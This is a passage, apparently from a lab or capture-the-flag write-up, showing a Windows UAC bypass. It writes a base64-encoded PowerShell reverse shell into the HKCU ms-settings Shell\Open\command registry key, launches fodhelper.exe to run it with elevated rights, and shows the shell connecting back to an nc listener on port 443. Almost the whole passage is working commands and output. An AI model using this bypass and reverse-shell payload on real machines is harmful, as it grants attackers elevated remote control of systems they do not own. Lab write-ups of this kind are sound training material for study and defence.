                  gs\Shell\Open\command
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settin
                  gs\Shell\Open
PSChildName     : command
PSDrive         : HKCU
PSProvider      : Microsoft.PowerShell.Core\Registry



PS C:\Users\Administrator\Desktop> 

```

```
PS C:\Users\Administrator\Desktop> Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -exec bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -exec bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" -Force

```

```
PS C:\Users\Administrator\Desktop> Get-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
Get-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command"


DelegateExecute : 
(default)       : powershell -exec bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0A
                  CAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoA
                  CIAMQAwAC4AMQAwAC4AMQA0AC4ANwA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkA
                  GMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5A
                  HQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgA
                  D0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0A
                  GUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOA
                  GUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4A
                  HQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5A
                  HQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkA
                  GEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiA
                  GEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3A
                  GQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0A
                  GUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzA
                  CgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlA
                  G4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0A
                  HIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settin
                  gs\Shell\Open\command
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settin
                  gs\Shell\Open
PSChildName     : command
PSDrive         : HKCU
PSProvider      : Microsoft.PowerShell.Core\Registry



```

Now to trigger, run `fodhelper.exe`:

```
PS C:\> \Windows\system32\fodhelper.exe
```

And a shell connects back to another listening `nc`:

```
$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.234.59 50081

PS C:\Windows\system32>
```
